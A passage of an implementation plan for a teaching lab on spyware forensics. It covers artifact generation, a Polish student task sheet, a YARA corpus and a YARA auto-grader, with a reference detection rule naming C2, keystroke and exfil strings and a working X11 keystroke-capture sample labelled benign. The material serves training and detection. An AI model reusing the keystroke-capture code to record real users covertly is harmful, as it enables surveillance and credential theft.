sha256sum module-casefile/round-1/*.pcap module-casefile/round-1/auth.log module-casefile/round-1/syslog module-casefile/round-1/process-list.txt module-casefile/round-1/stolen-data-sample.json > /tmp/casefile-sha.before
rm module-casefile/round-1/*.pcap module-casefile/round-1/auth.log module-casefile/round-1/syslog module-casefile/round-1/process-list.txt module-casefile/round-1/stolen-data-sample.json
python -m generators.generate_pcap --round 1 --output module-casefile/round-1/network-capture.pcap
python -m generators.generate_logs --round 1 --output-dir module-casefile/round-1
python -m generators.generate_artifacts --round 1 --output-dir module-casefile/round-1
sha256sum module-casefile/round-1/*.pcap module-casefile/round-1/auth.log module-casefile/round-1/syslog module-casefile/round-1/process-list.txt module-casefile/round-1/stolen-data-sample.json > /tmp/casefile-sha.after
diff /tmp/casefile-sha.before /tmp/casefile-sha.after
```

Expected: `diff` produces no output (files are byte-identical across runs).

- [ ] **Step 5: Commit the artifacts**

```bash
git add module-casefile/round-1/
git commit -m "chore(casefile): generate R1 pcap, logs, process list, stolen-data sample"
```

---

### Task 20 — `test_casefile_structure.py` — R1 casefile layout + leak guard

Asserts every expected file for R1 exists in `module-casefile/round-1/` and that no instructor-only content has leaked in.

**Files:**
- Create: `tests/test_casefile_structure.py`

- [ ] **Step 1: Write the test**

Create `tests/test_casefile_structure.py`:
```python
"""Casefile structural contract — every expected file must exist, no leaks."""
import pathlib

REPO_ROOT = pathlib.Path(__file__).parent.parent
CASEFILE = REPO_ROOT / "module-casefile"
TECHLAB = REPO_ROOT / "module-techlab"


def test_round_1_casefile_has_expected_files():
    root = CASEFILE / "round-1"
    required = [
        "network-capture.pcap",
        "auth.log",
        "syslog",
        "process-list.txt",
        "stolen-data-sample.json",
        "zadania.md",
        "yara-corpus/positive/spyware-r1.py",
        "yara-corpus/negative/benign-http-client.py",
        "yara-corpus/negative/legit-monitor.py",
        "yara-corpus/negative/curl-example.sh",
    ]
    missing = [p for p in required if not (root / p).exists()]
    assert not missing, f"missing casefile entries: {missing}"


def test_no_instructor_notes_file_in_any_casefile_round():
    """Instructor-only content must never be shipped in casefile/. Leak-guard."""
    leaked = list(CASEFILE.rglob("instructor-notes.md"))
    assert not leaked, f"instructor-notes.md leaked into casefile: {leaked}"


def test_no_techlab_instructor_paths_mirrored_under_casefile():
    """If any path under module-techlab/rounds/*/instructor-notes.md exists, it
    must not have a twin under module-casefile/."""
    for inotes in TECHLAB.rglob("instructor-notes.md"):
        rel = inotes.relative_to(TECHLAB / "rounds")
        # e.g. rel = round-1-naive/instructor-notes.md
        twin = CASEFILE / rel.parent.name.replace("-naive", "").replace("round-", "round-") / "instructor-notes.md"
        assert not twin.exists(), f"mirrored instructor notes present: {twin}"


def test_r1_casefile_pcap_is_nonempty():
    pcap = CASEFILE / "round-1" / "network-capture.pcap"
    assert pcap.stat().st_size > 200


def test_r1_casefile_stolen_data_is_valid_jsonl():
    import json
    p = CASEFILE / "round-1" / "stolen-data-sample.json"
    for line in p.read_text().splitlines():
        if line.strip():
            json.loads(line)
```

- [ ] **Step 2: Run test to verify what's missing**

Run: `pytest tests/test_casefile_structure.py -v`
Expected: `test_round_1_casefile_has_expected_files` FAILS (zadania.md + yara-corpus still absent — they land in Tasks 21 and 22).

- [ ] **Step 3: No implementation this task**

- [ ] **Step 4: Confirm intentional red state**

The other four tests should already pass (artifacts exist from Task 19, no leaks yet, pcap nonempty, JSONL parseable).

Run: `pytest tests/test_casefile_structure.py -v`
Expected breakdown: 4 passed, 1 failed (missing zadania + yara-corpus).

- [ ] **Step 5: Commit**

```bash
git add tests/test_casefile_structure.py
git commit -m "test(casefile): structural contract + instructor-notes leak guard"
```

---

### Task 21 — `module-casefile/round-1/zadania.md` (Polish, offline)

Casefile variant of the R1 task sheet. Students run *without* Docker — they receive the pcap, logs, process list, and stolen-data JSON as files and perform the analysis on their own workstation. Text largely mirrors techlab `zadania.md` but swaps "uruchom w kontenerze" for "otwórz plik".

**Files:**
- Create: `module-casefile/round-1/zadania.md`

- [ ] **Step 1: Write the structural test**

Append to `tests/test_casefile_structure.py`:
```python
def test_r1_casefile_zadania_is_polish_and_references_files():
    text = (CASEFILE / "round-1" / "zadania.md").read_text(encoding="utf-8")
    polish = sum(text.count(ch) for ch in "ąćęłńóśźżĄĆĘŁŃÓŚŹŻ")
    assert polish >= 20
    for fname in ("network-capture.pcap", "process-list.txt", "stolen-data-sample.json"):
        assert fname in text, f"zadania.md does not reference {fname}"
    assert "YARA" in text
    assert "NIST SP 800-61" in text
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_casefile_structure.py::test_r1_casefile_zadania_is_polish_and_references_files -v`
Expected: FileNotFoundError (zadania.md still absent).

- [ ] **Step 3: Write the Polish document**

Create `module-casefile/round-1/zadania.md`:

```markdown
# Runda 1 — Naïve: zadania (wariant casefile / offline)

> Wariant do pracy bez Dockera. Otrzymałeś/aś paczkę artefaktów:
>
> - `network-capture.pcap` — ruch sieciowy z momentu infekcji,
> - `auth.log`, `syslog` — logi systemowe ze stacji `workstation-042`,
> - `process-list.txt` — migawka `ps -elf` z zainfekowanej stacji,
> - `stolen-data-sample.json` — fragmenty danych odebrane przez C2 (jedna linia = jeden POST),
> - `yara-corpus/` — próbki pozytywne i negatywne do auto-oceny Twojej reguły YARA.
>
> Używasz Wireshark/tshark, `yara`, dowolnego edytora tekstu. Docker nie jest wymagany.

## Cel
Na podstawie artefaktów odtwórz działanie spyware z Rundy 1, udokumentuj IOCs, napisz regułę YARA i raport incydentu.

## Faza red team

### 1. Analiza `process-list.txt`
- Wypisz procesy nienależące do typowego zestawu systemowego.
- Zidentyfikuj proces ze ścieżką `/opt/spyware/spyware.py`. Podaj PID, PPID, UID, czas startu.

### 2. Analiza pcap
- Wczytaj `network-capture.pcap` w Wireshark.
- Filtr: `http.request.method == "POST"`.
- Odpowiedz: IP źródłowe, docelowe, port, URL, Content-Type.
- Wyciągnij treść żądania (Follow TCP Stream) — to bezpośrednio wykradzione dane.

### 3. Korelacja z `stolen-data-sample.json`
- Policz liczbę rekordów. Sprawdź odstępy `ts_epoch` — wyznacz odstęp między eksfiltracjami.
- Wyszczególnij: jakie kategorie plików są wykradane, ile danych klawiszy znajduje się w pojedynczym rekordzie.

### 4. Logi
- W `auth.log` znajdź rozpoczęcie sesji użytkownika `analyst`.
- W `syslog` odszukaj ślady łączenia się do C2 (wiadomości jądra z `DST=...`).
- Zbuduj krótką oś czasu: logowanie → start spyware → pierwszy POST.

## Faza blue team

### 5. Tabela IOC + MITRE ATT&CK
Sporządź tabelę:

| IOC | Wartość | Źródło (pcap/log/...) | MITRE ATT&CK |
|---|---|---|---|
| np. adres C2 | `10.13.37.1:8080` | pcap | T1071.001 |
| ... | ... | ... | ... |

Dozwolony zbiór technik dla R1 (ekskluzywnie): **T1056.001, T1113, T1005, T1071.001, T1041**. Jeśli deklarujesz coś spoza tej listy — uzasadnij.

### 6. Reguła YARA
Napisz `r1-ghost-naive.yar` dopasowującą próbkę R1 (dostępną w `yara-corpus/positive/spyware-r1.py`), a **nie** dopasowującą żadnej próbki z `yara-corpus/negative/`. Minimalne wymagania:

- co najmniej trzy odrębne ciągi `strings:` (plus jedno dopasowanie headera laboratorium),
- kondycja łącząca ≥ 2 ciągi AND'em.

Auto-oceniaj regułę lokalnie:

```
python -m tests.test_detection_rules --rule r1-ghost-naive.yar
```

Wymaga: precyzja ≥ 0.95, recall = 1.0.

### 7. Raport incydentu (NIST SP 800-61r2)
Dostarcz jednostronicowy raport opisujący fazy Detection / Containment / Eradication / Recovery. Załącznik: tabela IOC + MITRE ATT&CK z Kroku 5.

## Kryteria zaliczenia
- Poprawnie zidentyfikowane wszystkie 5 technik MITRE dla R1.
- Reguła YARA przechodzi próg auto-gradera.
- Raport zgodny z NIST 800-61r2, zawiera załącznik z mapowaniem.
```

- [ ] **Step 4: Run tests**

Run: `pytest tests/test_casefile_structure.py -v -k "zadania or expected_files"`
Expected: `test_r1_casefile_zadania_is_polish_and_references_files` passes; `test_round_1_casefile_has_expected_files` still fails (yara-corpus missing).

- [ ] **Step 5: Commit**

```bash
git add module-casefile/round-1/zadania.md tests/test_casefile_structure.py
git commit -m "docs(casefile): R1 Polish zadania.md for offline analysis"
```

---

### Task 22 — YARA corpus + negative samples

The YARA grader (Task 23) needs a directory with labeled positive/negative samples. Positives: the R1 spyware itself (copied from `core/spyware-samples/round-1/`). Negatives: three hand-written benign scripts that share *some* surface with the sample (same language, similar imports, comparable string patterns) so naive rules fail on them.

**Files:**
- Create: `module-casefile/round-1/yara-corpus/positive/spyware-r1.py` (copy)
- Create: `module-casefile/round-1/yara-corpus/negative/benign-http-client.py`
- Create: `module-casefile/round-1/yara-corpus/negative/legit-monitor.py`
- Create: `module-casefile/round-1/yara-corpus/negative/curl-example.sh`

- [ ] **Step 1: Run the existing structural test**

Run: `pytest tests/test_casefile_structure.py::test_round_1_casefile_has_expected_files -v`
Expected: FAIL — yara-corpus entries missing.

- [ ] **Step 2: Create the corpus directories and content**

Copy the positive sample:
```bash
mkdir -p module-casefile/round-1/yara-corpus/positive module-casefile/round-1/yara-corpus/negative
cp core/spyware-samples/round-1/spyware.py module-casefile/round-1/yara-corpus/positive/spyware-r1.py
```

Create `module-casefile/round-1/yara-corpus/negative/benign-http-client.py`:
```python
"""Benign example: periodic metric uploader. Shares HTTP-exfil surface with the
spyware but is clearly legitimate (documented, no keystroke capture, no file
harvest). A YARA rule that hits this file is too broad."""
import json
import time
import requests

METRICS_URL = "https://metrics.example.org/ingest"
DEVICE = "workstation-042"


def collect_metrics() -> dict:
    return {
        "host": DEVICE,
        "cpu_load": 0.12,
        "mem_used_mb": 4096,
        "uptime_s": int(time.monotonic()),
    }


def main():
    while True:
        r = requests.post(METRICS_URL, json=collect_metrics(), timeout=5)
        r.raise_for_status()
        time.sleep(60)


if __name__ == "__main__":
    main()
```

Create `module-casefile/round-1/yara-corpus/negative/legit-monitor.py`:
```python
"""Benign example: local Xlib key-event listener used by an accessibility tool.
Imports Xlib and reads keysyms, but posts nothing off-box — everything stays
local. A rule that hits 'Xlib + KeyPress' alone would misclassify this."""
from Xlib import display, X
from Xlib.ext import record
from Xlib.protocol import rq


def main():
    local_dpy = display.Display()
    record_dpy = display.Display()

    def handler(reply):
        if reply.category != record.FromServer:
            return
        data = reply.data
        while len(data):
            event, data = rq.EventField(None).parse_binary_value(data, record_dpy.display, None, None)
            if event.type == X.KeyPress:
                keysym = local_dpy.keycode_to_keysym(event.detail, 0)
                print(f"key: {keysym}")

    ctx = record_dpy.record_create_context(
        0, [record.AllClients],
        [{
            "core_requests": (0, 0), "core_replies": (0, 0),
            "ext_requests": (0, 0, 0, 0), "ext_replies": (0, 0, 0, 0),
            "delivered_events": (0, 0),
            "device_events": (X.KeyPress, X.MotionNotify),
            "errors": (0, 0),
            "client_started": False, "client_died": False,
        }],
    )
    record_dpy.record_enable_context(ctx, handler)


if __name__ == "__main__":
    main()
```

Create `module-casefile/round-1/yara-corpus/negative/curl-example.sh`:
```bash
#!/usr/bin/env bash
# Benign shell example — shares the C2 subnet range as a coincidence.
set -euo pipefail
curl -fsS -X POST "http://10.13.37.99:9000/telemetry" \
    -H 'Content-Type: application/json' \
    -d '{"host":"workstation-042","reason":"nightly-backup"}'
```

- [ ] **Step 3: Run the structural test**

Run: `pytest tests/test_casefile_structure.py -v`
Expected: all tests pass.

- [ ] **Step 4: Sanity-check that the reference YARA rule hits positive and misses all negatives**

Save the reference rule from `module-techlab/rounds/round-1-naive/instructor-notes.md` to a temp file and run:

```bash
mkdir -p /tmp/ref-yara
cat > /tmp/ref-yara/ref.yar <<'EOF'
rule Ghost_R1_Naive_Spyware
{
    meta:
        author = "instructor"
        round = "1"
    strings:
        $lab_header = "GHOST-IN-THE-BOX LAB"
        $c2_ip = "10.13.37.1"
        $field1 = "screenshot_bytes"
        $field2 = "\"keys\""
        $import_http = "import exfil_http"
    condition:
        $lab_header and (3 of ($c2_ip, $field1, $field2, $import_http))
}
EOF
yara /tmp/ref-yara/ref.yar module-casefile/round-1/yara-corpus/positive/
yara /tmp/ref-yara/ref.yar module-casefile/round-1/yara-corpus/negative/ || true
```

Expected: first `yara` prints one line matching the positive; second prints nothing (no false positives).

- [ ] **Step 5: Commit**

```bash
git add module-casefile/round-1/yara-corpus/
git commit -m "chore(casefile): R1 YARA corpus (positive + 3 negatives)"
```

---

### Task 23 — `test_detection_rules.py` — R1 YARA auto-grader

The auto-grader runs a student-supplied YARA rule against the positive + negative corpus, computes precision and recall, and asserts thresholds. The same module is used both by `pytest` (for instructor-baseline regression) and by students running a self-check locally.

**Files:**
- Create: `tests/test_detection_rules.py`
- Modify: `module-techlab/analyst-ws/requirements.txt` already has `yara-python`.

- [ ] **Step 1: Write the test**

Create `tests/test_detection_rules.py`:
```python
"""Auto-grader for student YARA/Sigma/Suricata rule deliverables.

This module is both a pytest suite (instructor-baseline regression) and a CLI
student self-check: `python -m tests.test_detection_rules --rule my.yar`.
"""
from __future__ import annotations

import argparse
import pathlib
import sys

import pytest

yara = pytest.importorskip("yara")

REPO_ROOT = pathlib.Path(__file__).parent.parent
CASEFILE = REPO_ROOT / "module-casefile"


def _load_corpus(round_num: int) -> tuple[list[pathlib.Path], list[pathlib.Path]]:
    root = CASEFILE / f"round-{round_num}" / "yara-corpus"
    pos = sorted((root / "positive").glob("*"))
    neg = sorted((root / "negative").glob("*"))
    return pos, neg


def grade(rule_source: str, round_num: int) -> dict:
    """Run a YARA rule against the round's corpus; return precision/recall."""
    compiled = yara.compile(source=rule_source)
    pos, neg = _load_corpus(round_num)
    tp = sum(1 for p in pos if compiled.match(str(p)))
    fn = len(pos) - tp
    fp = sum(1 for n in neg if compiled.match(str(n)))
    tn = len(neg) - fp
    precision = tp / (tp + fp) if (tp + fp) else 0.0
    recall = tp / (tp + fn) if (tp + fn) else 0.0
    return {
        "tp": tp, "fp": fp, "tn": tn, "fn": fn,
        "precision": precision, "recall": recall,
        "positive_corpus_size": len(pos),
        "negative_corpus_size": len(neg),
    }


# --- Regression on the instructor baseline ---------------------------------

REFERENCE_R1_RULE = r"""
rule Ghost_R1_Naive_Spyware
{
    meta:
        author = "instructor"
        round = "1"
    strings:
        $lab_header = "GHOST-IN-THE-BOX LAB"
        $c2_ip = "10.13.37.1"
        $field1 = "screenshot_bytes"
        $field2 = "\"keys\""
        $import_http = "import exfil_http"
    condition:
        $lab_header and (3 of ($c2_ip, $field1, $field2, $import_http))
}
"""


def test_reference_r1_rule_perfect_on_corpus():
    result = grade(REFERENCE_R1_RULE, round_num=1)
    assert result["recall"] == 1.0, result
    assert result["precision"] >= 0.95, result


def test_overbroad_rule_is_caught_by_grader():
    """A rule that only matches a shared substring must fail precision."""
    overbroad = r"""
rule Overbroad { strings: $s = "workstation-042" condition: $s }
"""
    result = grade(overbroad, round_num=1)
    # This hits the positive AND at least one negative (benign-http-client.py mentions the hostname).
    assert result["precision"] < 0.95, result


def test_too_narrow_rule_fails_recall():
    """A rule that fails to match the positive must fail recall."""
    too_narrow = r"""
rule Narrow { strings: $s = "completely-unrelated-literal-xyz" condition: $s }
"""
    result = grade(too_narrow, round_num=1)
    assert result["recall"] == 0.0, result


# --- CLI mode (student self-check) ----------------------------------------

def _cli(argv: list[str]) -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--rule", type=pathlib.Path, required=True)
    ap.add_argument("--round", type=int, default=1)
    ap.add_argument("--min-precision", type=float, default=0.95)
    ap.add_argument("--min-recall", type=float, default=1.0)
    args = ap.parse_args(argv)

    source = args.rule.read_text(encoding="utf-8")
    result = grade(source, round_num=args.round)
    print(f"precision={result['precision']:.3f} recall={result['recall']:.3f} "
          f"tp={result['tp']} fp={result['fp']} fn={result['fn']}")
    if result["precision"] < args.min_precision or result["recall"] < args.min_recall:
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(_cli(sys.argv[1:]))
```

- [ ] **Step 2: Run test to verify it fails (not installed) or is yellow (skipped)**

Run: `pytest tests/test_detection_rules.py -v`
Expected: SKIPPED with `pytest.importorskip('yara')` message, unless `yara-python` is installed on the test host.

Run: `pip install yara-python==4.5.1 && pytest tests/test_detection_rules.py -v`
Expected: 3 passed.

- [ ] **Step 3: Confirm CLI mode**

```bash
cat > /tmp/student-rule.yar <<'EOF'
rule MyR1 {
    strings: $h = "GHOST-IN-THE-BOX LAB" $c = "10.13.37.1" $f = "screenshot_bytes"
    condition: all of them
}
EOF
python -m tests.test_detection_rules --rule /tmp/student-rule.yar --round 1
```
Expected stdout: `precision=1.000 recall=1.000 tp=1 fp=0 fn=0`; exit code 0.

- [ ] **Step 4: Document the grader in instructor-notes**

Edit `module-techlab/rounds/round-1-naive/instructor-notes.md` and append (at the end of the file):
```markdown
## Running the YARA grader

The grader lives at `tests/test_detection_rules.py`. Use pytest for baseline regression (`pytest tests/test_detection_rules.py`) or run it as a CLI for individual student rules:
```bash
python -m tests.test_detection_rules --rule path/to/student.yar --round 1
```
```

- [ ] **Step 5: Commit**

```bash
git add tests/test_detection_rules.py module-techlab/rounds/round-1-naive/instructor-notes.md
git commit -m "feat(detection): R1 YARA auto-grader with CLI self-check"
```

---

## Self-Review

### 1. Spec coverage

| Spec section | Task(s) |
|---|---|
| Scenario constants (`scenario_facts.py`) | 1 |
| Sample header convention + per-round MITRE allowlist | 1, 2, 3 |
| Scenario narrative (`briefing.md`, `attacker-profile.md`, Polish) | 8 |
| Shared collector (keylogger + harvester + screenshot) | 4, 5 |
| Shared HTTP exfil | 6 |
| R1 sample (`round-1/spyware.py`) | 7 |
| Docker isolated network (`ghost-net`, `internal: true`) | 9 |
| Victim container (Ubuntu 24, Xvfb, ROUND build arg) | 10 |
| C2 server (HTTP receiver, JSONL log) | 11 |
| Analyst workstation (full forensics toolchain) | 12 |
| R1 techlab integration test | 13 |
| R1 techlab `zadania.md` (Polish) | 14 |
| R1 `instructor-notes.md` (MITRE GT + reference YARA) | 15 |
| Generators (deterministic, seeded) | 16, 17, 18 |
| R1 casefile artifacts populated | 19 |
| Casefile structure + leak guard | 20 |
| R1 casefile `zadania.md` (Polish, offline) | 21 |
| R1 YARA corpus (positive + negatives) | 22 |
| R1 YARA auto-grader | 23 |

Out-of-scope (explicitly deferred): R2 sample, HTTPS + TLS keylogging, memory forensics + Volatility symbol pack exercise, Sigma rule + grader, R3 sample, `libhide.so`, DNS tunneling + `dns-server` service, Suricata rule + grader, quantitative DNS notebook, `test_techlab_integration.py` R2/R3 cases.

### 2. Placeholder scan

No `TBD`, `implement later`, or "similar to Task N" references remain. Polish content is specified as detailed section-level outlines with bullet substance — an intentional exception flagged in the Conventions section at the top of this plan. All code blocks are runnable.

### 3. Type / signature consistency

- `Keylogger` exposes the same public API in every task that touches it (`buffer: list[str]`, `start()`, `stop()`, `flush()`, `active_backend`, `BACKEND_PREFERENCE`).
- `HttpExfilClient(host, port, *, timeout)` — same signature wherever referenced.
- `harvest_files(home: Path, relative_paths: Iterable[str], *, binary: bool = False)` — same signature in tests and implementation.
- `take_screenshot(output_path: Path) -> bool` — same.
- Generator module entry points: each module exposes `generate(output_path, round_num)` *or* `generate(output_dir, round_num)` consistently (pcap = single-file, logs + artifacts = directory-writing). Tests match.
- `parse_header(path) -> SampleHeader` — fields `source_path`, `round`, `scope_note`, `mitre_ttps` used identically across `test_spyware_samples.py` and `test_mitre_mapping.py`.

---

## Execution Handoff

**Plan complete and saved to `docs/superpowers/plans/2026-04-15-foundation-and-round-1.md`. Two execution options:**

**1. Subagent-Driven (recommended)** — I dispatch a fresh subagent per task, review between tasks, fast iteration.

**2. Inline Execution** — Execute tasks in this session using executing-plans, batch execution with checkpoints for review.

**Which approach?**
